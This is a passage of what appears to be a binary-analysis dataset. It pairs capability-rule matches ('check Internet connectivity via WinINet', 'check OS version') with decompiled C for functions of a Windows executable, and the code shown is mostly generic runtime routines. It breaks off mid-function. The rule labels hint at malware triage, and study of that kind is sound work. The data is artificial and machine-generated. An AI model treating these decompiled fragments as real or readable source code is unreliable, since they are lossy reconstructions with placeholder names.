        "decompiled_code": "\nuint __fastcall fcn.00405957(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 83
    },
    "00405961": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405961(uint arg_8h, uint arg_ch)\n\n{\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_4h;\n    \n    fcn.004057e5(arg_ch);\n    fcn.004060eb(*var_ch, arg_8h, 0x8000);\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00405984": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405984(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int64_t iVar3;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0xffffffff;\n    }\n    if (arg_ch == NULL) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar3 = fcn.004040f2(arg_8h);\n        *arg_ch = iVar3;\n        arg_ch[1] = iVar3 >> 0x20;\n        uVar2 = 0xffffffff;\n        if (iVar3 != -1) {\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 229
    },
    "00461ac3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00461ac3(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_10h_00;\n    uint32_t var_4h;\n    \n    if ((arg_10h < 1) && ((arg_10h < 0 || (arg_ch == 0)))) {\n        iVar1 = 0;\n    }\n    else if (*(in_ECX + 0x38) == 0) {\n        if ((**(in_ECX + 0x1c) == 0) || (var_4h = **(in_ECX + 0x2c),  var_4h == 0)) {\n            var_4h = arg_8h;\n            arg_10h_00 = arg_ch;\n        }\n        else {\n            if (arg_ch <= var_4h) {\n                var_4h = arg_ch;\n            }\n            fcn.0040576d(arg_8h, **(in_ECX + 0x1c), var_4h);\n            **(in_ECX + 0x2c) = **(in_ECX + 0x2c) - var_4h;\n            **(in_ECX + 0x1c) = **(in_ECX + 0x1c) + var_4h;\n            arg_10h_00 = arg_ch - var_4h;\n            var_4h = arg_8h + var_4h;\n        }\n        if (*(in_ECX + 0x4c) != 0) {\n            fcn.004036cf();\n            do {\n                if (arg_10h_00 < 0x1000) {\n                    if (arg_10h_00 != 0) {\n                        iVar1 = fcn.0040555b(var_4h, 1, arg_10h_00, *(in_ECX + 0x4c));\n                        arg_10h_00 = arg_10h_00 - iVar1;\n                    }\n                    break;\n                }\n                iVar1 = fcn.0040555b(var_4h, 1, 0xfff, *(in_ECX + 0x4c));\n                arg_10h_00 = arg_10h_00 - iVar1;\n                var_4h = var_4h + iVar1;\n            } while (iVar1 == 0xfff);\n        }\n        iVar1 = arg_ch - arg_10h_00;\n    }\n    else {\n        iVar1 = fcn.00404f16(arg_8h, arg_ch, arg_10h);\n    }\n    return iVar1;\n}\n",
        "token_count": 605
    },
    "004059e3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059e3(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.0040597a(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00405a15": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405a15(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        uVar2 = fcn.00403819(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x32), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 196
    },
    "00405a56": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00405a56(int32_t param_1, uint param_2, char param_3)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    int32_t **in_FS_OFFSET;\n    uchar auStack132 [44];\n    uchar auStack88 [44];\n    int32_t iStack44;\n    int32_t iStack40;\n    uint *puStack36;\n    uchar *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack132;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e4b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack36 = fcn.00401366();\n    fcn.004026d5(auStack132);\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    uStack20 = 0;\n    iStack44 = param_1;\n    iStack40 = param_1;\n    fcn.004026d5(auStack88);\n    uVar5 = 0x54018f;\n    if (param_3 == '\\0') {\n        uVar5 = puStack36[2];\n    }\n    iVar2 = fcn.004061db(uVar5);\n    iVar2 = iVar2 + 1;\n    iVar3 = fcn.00403387(iVar2, 1);\n    if (iVar3 == 0) {\n        fcn.004010a5();\n    }\n    else {\n        if (iVar2 != 0) {\n            fcn.0040576d(iVar3, uVar5, iVar2);\n        }\n        iVar2 = iStack40;\n        *(iStack40 + 8) = iVar3;\n        puVar4 = fcn.00403387(6, 1);\n        if (puVar4 != NULL) {\n            *(puVar4 + 1) = 0x65;\n            *puVar4 = 0x736c6166;\n            *(iVar2 + 0x10) = puVar4;\n            puVar4 = fcn.00403387(5, 1);\n            if (puVar4 != NULL) {\n                *(puVar4 + 1) = 0;\n                *puVar4 = 0x65757274;\n                *(iVar2 + 0x14) = puVar4;\n                if (param_3 == '\\0') {\n                    *(iVar2 + 0xc) = **puStack36;\n                    uVar1 = *puStack36[1];\n                }\n                else {\n                    *(iVar2 + 0xc) = 0x2e;\n                    uVar1 = 0x2c;\n                }\n                *(iVar2 + 0xd) = uVar1;\n                *in_FS_OFFSET = piStack28;\n                return;\n            }\n            goto code_r0x0041c813;\n        }\n    }\n    fcn.004010a5();\ncode_r0x0041c813:\n    fcn.004010a5();\n    fcn.0040477d();\n    return;\n}\n",
        "token_count": 748
    },
    "00405a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a60(uint *arg_8h)\n\n{\n    if (*(arg_8h + 1) != '\\0') {\n        fcn.004040d9(*arg_8h);\n    }\n    *arg_8h = 0;\n    *(arg_8h + 1) = 0;\n    return;\n}\n",
        "token_count": 79
    },
    "00405a6a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.00405a6a(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    ushort uVar4;\n    \n    if ((*param_1[7] != 0) && (piVar1 = param_1[0xb],  0 < *piVar1)) {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *param_1[7];\n        *param_1[7] = puVar2 + 1;\n        return *puVar2;\n    }\n    pcVar3 = *(*param_1 + 0x1c);\n    (**0x573000)();\n    uVar4 = (*pcVar3)();\n    return uVar4;\n}\n",
        "token_count": 178
    },
    "00405b73": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405b73(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.004039a4();\n        *puVar6 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049e506:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049e50a:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049e50d:\n            cVar4 = fcn.00403760(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049e4b2:\n                arg_8h = 0x10;\n                goto code_r0x0049e50d;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049e4c6;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049e49a;\n                }\n            }\ncode_r0x0049e516:\n            cVar4 = fcn.004014d3();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405e66();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049e516;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049e4c6:\n            cVar4 = fcn.00405222(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004060e1();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049e516;\n            if (cVar4 == 'i') goto code_r0x0049e506;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00406523();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00403e13();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049e4b2;\n            }\n            goto code_r0x0049e50a;\n        }\ncode_r0x0049e49a:\n        cVar4 = fcn.004020d1();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00403094();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x0049e5ab;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049e5ab:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403cd3(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.00405df8(&uStack8, arg_ch, arg_14h, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403cd3(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00404110(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403cd3(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2411
    },
    "00405b7d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00405b7d(uint arg_8h)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char extraout_CL;\n    uint8_t uVar6;\n    char cVar7;\n    int32_t iVar8;\n    int32_t unaff_EBP;\n    code *pcVar9;\n    uint *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b278, 0x24);\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x19) = 1;\n    iVar4 = *(unaff_EBP + 8);\n    if (8 < iVar4) {\n        if (iVar4 == 0xb) goto code_r0x004c93ac;\n        if ((iVar4 == 0xf) || ((0x14 < iVar4 && (iVar4 < 0x17)))) goto code_r0x004c939f;\ncode_r0x004c93d0:\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\ncode_r0x004c93ba:\n        uVar5 = 0xffffffff;\n        goto code_r0x004c951f;\n    }\n    if (iVar4 == 8) {\ncode_r0x004c93ac:\n        puVar2 = fcn.004067f8();\n        *(unaff_EBP + -0x20) = puVar2;\n        if (puVar2 == NULL) goto code_r0x004c93ba;\n        iVar3 = fcn.004c9273(iVar4, *puVar2);\n        if (iVar3 == 0) goto code_r0x004c93d0;\n        ppcVar1 = iVar3 + 8;\n        cVar7 = '\\0';\n        *(unaff_EBP + -0x19) = 0;\n    }\n    else {\n        if (iVar4 != 2) {\n            if (iVar4 == 4) goto code_r0x004c93ac;\n            if (iVar4 != 6) goto code_r0x004c93d0;\n        }\ncode_r0x004c939f:\n        ppcVar1 = fcn.004c91b2(iVar4);\n        cVar7 = extraout_CL;\n    }\n    *(unaff_EBP + -0x24) = ppcVar1;\n    *(unaff_EBP + -0x2c) = 0;\n    if (cVar7 != '\\0') {\n        fcn.00406401(3);\n        cVar7 = *(unaff_EBP + -0x19);\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x1a) = 0;\n    *(unaff_EBP + -4) = 0;\n    pcVar9 = *ppcVar1;\n    if (cVar7 != '\\0') {\n        uVar6 = *0x56cca8 & 0x1f;\n        pcVar9 = (pcVar9 ^ *0x56cca8) >> uVar6 | (pcVar9 ^ *0x56cca8) << 0x20 - uVar6;\n        cVar7 = *(unaff_EBP + -0x19);\n    }\n    *(unaff_EBP + -0x28) = pcVar9;\n    *(unaff_EBP + -0x1a) = pcVar9 == 0x1;\n    if (pcVar9 != 0x1) {\n        if (pcVar9 == NULL) {\n            if (cVar7 != '\\0') {\n                fcn.00401cbc(3);\n            }\n            fcn.00405fc9(3);\n            pcVar9 = swi(3);\n            uVar5 = (*pcVar9)();\n            return uVar5;\n        }\n        if (((iVar4 == 8) || (iVar4 == 0xb)) || (iVar4 == 4)) {\n            *(unaff_EBP + -0x2c) = *(*(unaff_EBP + -0x20) + 4);\n            *(*(unaff_EBP + -0x20) + 4) = 0;\n            if (iVar4 == 8) {\n                iVar3 = fcn.00404331();\n                *(unaff_EBP + -0x30) = *(iVar3 + 8);\n                iVar3 = fcn.00404331();\n                *(iVar3 + 8) = 0x8c;\n                goto code_r0x004c9474;\n            }\n        }\n        else {\ncode_r0x004c9474:\n            if (iVar4 == 8) {\n                iVar8 = *0x55062c * 0xc + **(unaff_EBP + -0x20);\n                iVar3 = *0x550630 * 0xc + iVar8;\n                for (; *(unaff_EBP + -0x34) = iVar8,  iVar8 != iVar3; iVar8 = iVar8 + 0xc) {\n                    *(iVar8 + 8) = 0;\n                }\n                goto code_r0x004c94a7;\n            }\n        }\n        **(unaff_EBP + -0x24) = *0x56cca8;\n    }\ncode_r0x004c94a7:\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004c94dc();\n    if (*(unaff_EBP + -0x1a) == '\\0') {\n        if (iVar4 == 8) {\n            iVar3 = fcn.00404331();\n            (**0x573000)(8, *(iVar3 + 8));\n            (*pcVar9)();\n        }\n        else {\n            (**0x573000)(iVar4);\n            (*pcVar9)();\n            if ((iVar4 != 0xb) && (iVar4 != 4)) goto code_r0x004c951d;\n        }\n        *(*(unaff_EBP + -0x20) + 4) = *(unaff_EBP + -0x2c);\n        if (iVar4 == 8) {\n            iVar4 = fcn.00404331();\n            *(iVar4 + 8) = *(unaff_EBP + -0x30);\n        }\n    }\ncode_r0x004c951d:\n    uVar5 = 0;\ncode_r0x004c951f:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar5;\n}\n",
        "token_count": 1578
    },
    "00405b8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00405b8c(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    uint32_t var_20h;\n    uint var_4h;\n    \n    puVar4 = &var_20h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_20h = var_20h & 0xffff0000 | in_FPUControlWord;\n    uVar1 = fcn.004dd618(in_FPUControlWord & 7999);\n    if (*0x56ec4c < 1) {\n        in_MXCSR = 0;\n    }\n    else {\n        in_MXCSR = in_MXCSR & 0xffc0;\n    }\n    uVar2 = fcn.004dd52d(in_MXCSR);\n    return uVar2 | ((((uVar2 & 0x3f) << 2 | uVar2 & 0xffffff00) << 6 | uVar1 & 0x3f) << 2 | uVar1 & 0x300) << 0xe |\n           uVar1;\n}\n",
        "token_count": 316
    },
    "00405bb9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405bb9(code **arg_8h, code **arg_ch)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    char cVar3;\n    code **ppcVar4;\n    \n    ppcVar4 = arg_8h;\n    if (arg_8h != arg_ch) {\n        do {\n            pcVar2 = *ppcVar4;\n            if (pcVar2 != NULL) {\n                (**0x573000)();\n                cVar3 = (*pcVar2)();\n                if (cVar3 == '\\0') break;\n            }\n            ppcVar4 = ppcVar4 + 2;\n        } while (ppcVar4 != arg_ch);\n        if (ppcVar4 != arg_ch) {\n            if (ppcVar4 != arg_8h) {\n                ppcVar4 = ppcVar4 + -1;\n                do {\n                    if ((ppcVar4[-1] != NULL) && (pcVar2 = *ppcVar4,  pcVar2 != NULL)) {\n                        (**0x573000)(0);\n                        (*pcVar2)();\n                    }\n                    ppcVar1 = ppcVar4 + -1;\n                    ppcVar4 = ppcVar4 + -2;\n                } while (ppcVar1 != arg_8h);\n            }\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 310
    },
    "00405c31": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405c31(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 347
    },
    "00405c4f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405c4f(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00403819(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 352
    },
    "00405c95": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c95(code **arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code **arg_8h_00;\n    int32_t *in_ECX;\n    \n    if ((*(in_ECX + 1) < '\\x02') && (0 < arg_8h[1])) {\n        if (*in_ECX == 0) {\n            fcn.004022a2(arg_8h);\n        }\n        else {\n            arg_8h_00 = fcn.004051dc(0xc);\n            if (arg_8h_00 == NULL) {\n                arg_8h_00 = NULL;\n            }\n            else {\n                pcVar1 = arg_8h[1];\n                pcVar2 = *arg_8h;\n                *arg_8h_00 = vtable.pcharNode.0;\n                arg_8h_00[1] = pcVar2;\n                arg_8h_00[2] = pcVar1;\n            }\n            fcn.004030b7(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "00405ca4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: lpCPInfo\n\nvoid __cdecl fcn.00405ca4(uint arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    ushort uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint8_t *puVar8;\n    uint uVar9;\n    ushort *puVar10;\n    ushort *puVar11;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar12;\n    int32_t var_20h;\n    uint8_t *var_1ch;\n    int32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar4 = fcn.004c5cad(arg_8h);\n    if (uVar4 != 0) {\n        uVar12 = 0;\n        uVar5 = 0;\n        var_1ch = NULL;\ncode_r0x004c6303:\n        if (*(uVar5 + 0x56d4b0) != uVar4) goto code_r0x004c630f;\n        fcn.0040314d(arg_ch + 0x18, 0, 